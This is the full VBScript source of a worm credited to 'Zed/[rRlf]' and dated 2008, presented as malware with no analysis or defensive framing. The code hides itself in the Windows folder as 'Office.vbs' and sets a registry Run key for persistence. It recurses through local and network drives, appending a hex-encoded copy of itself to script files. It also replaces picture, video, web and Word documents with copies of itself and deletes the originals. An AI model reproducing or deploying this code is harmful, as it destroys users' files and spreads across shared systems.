' VBS/Wshwc.The_Bastard by Zed/[rRlf], 21.02.2008
On Error Resume Next
Set VYBWNFJUJZHKTLLO7 = CreateObject("Scripting.FileSystemObject")
Set HENZPTMFTYYSZNXF8 = CreateObject("WScript.Shell")
Set MZVUCOEXOZOYJGFV9 = VYBWNFJUJZHKTLLO7.GetFile(WScript.ScriptFullName)
MZVUCOEXOZOYJGFV9.Copy (VYBWNFJUJZHKTLLO7.GetSpecialFolder(0) & "\Office.vbs")
Set HideWorm = VYBWNFJUJZHKTLLO7.GetFile(VYBWNFJUJZHKTLLO7.GetSpecialFolder(0) & "\Office.vbs")
HideWorm.Attributes = 2
HENZPTMFTYYSZNXF8.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Office32", "Wscript.exe " & VYBWNFJUJZHKTLLO7.GetSpecialFolder(0) & "\Office.vbs %1"
E1()
Sub E1()
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
For Each SeekNetCopyDrives In a.Drives
If SeekNetCopyDrives.DriveType = 2 _
Or SeekNetCopyDrives.DriveType = 3 Then
E3 (SeekNetCopyDrives.Path & "\")
End If
Next
End Sub
Sub E2(FileTarget)
On Error Resume Next
Set otf = a.GetFile(WScript.ScriptFullName)
ra = otf.ReadAll
otf.Close
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.Files
FileExt = LCase(a.GetExtensionName(n.Path))
If FileExt = "vbs" Or FileExt = "vbe" Then
Set openvbs = a.OpenTextFile(n.Path, 1)
vbsra = openvbs.ReadAll
openvbs.Close
If InStr(1, vbsra, "The_Bastard") = False Then
Set VYBWNFJUJZHKTLLO7 = CreateObject("Scripting.FileSystemObject")
Set JC = VYBWNFJUJZHKTLLO7.OpenTextFile(WScript.ScriptFullName, 1)
WormFileReadAllText = JC.ReadAll
JC.Close
Set WriteWormCode = VYBWNFJUJZHKTLLO7.OpenTextFile(n.Path, 8, True)
WriteWormCode.WriteLine vbCrLf & "' The_Bastard" & vbCrLf & "Tz = " & Chr(34) & Chr(34)
For i = 1 To Len(WormFileReadAllText)
Tz = Mid(WormFileReadAllText, i, 1)
Tz = Hex(Asc(Tz))
If Len(Tz) = 1 Then
Tz = "0" & Tz
End If
Gz = Gz + Tz
If Len(Gz) = 110 Then
WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
If Len(WormFileReadAllText) - i = 0 Then
WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
Next
WriteWormCode.WriteLine "Set VYBWNFJUJZHKTLLO7 = CreateObject(""Scripting.FileSystemObject"")"
WriteWormCode.WriteLine "Set HENZPTMFTYYSZNXF8 = CreateObject(""WScript.Shell"")"
WriteWormCode.WriteLine "Set WriteAppend = VYBWNFJUJZHKTLLO7.CreateTextFile(VYBWNFJUJZHKTLLO7.GetSpecialFolder(0) & ""\Office.vbs"", True)"
WriteWormCode.WriteLine "WriteAppend.Write CM(Tz)"
WriteWormCode.WriteLine "WriteAppend.Close"
WriteWormCode.WriteLine "HENZPTMFTYYSZNXF8.RegWrite ""HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Office32"", ""Wscript.exe "" & VYBWNFJUJZHKTLLO7.GetSpecialFolder(0) & ""\Office.vbs %1"""
WriteWormCode.WriteLine "Function CM(CN)"
WriteWormCode.WriteLine "For GC = 1 To Len(CN) Step 2"
WriteWormCode.WriteLine "CM = CM & Chr(""&h"" & Mid(CN, GC, 2))"
WriteWormCode.WriteLine "Next"
WriteWormCode.WriteLine "End Function"
WriteWormCode.Close
End If
End If
If FileExt = "jpg" Or FileExt = "html" Or FileExt = "mpg" Or FileExt = "htm" Or FileExt = "doc" Or FileExt = "avi" Then
VYBWNFJUJZHKTLLO7.CopyFile WScript.ScriptFullName, n.Path & ".vbs"
VYBWNFJUJZHKTLLO7.DeleteFile (n.Path)
End If
Next
End Sub
Sub E3(FileTarget)
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.SubFolders
E2 (n.Path)
E3 (n.Path)
Next
End Sub
' Wshwc 1.0 by Zed/[rRlf]
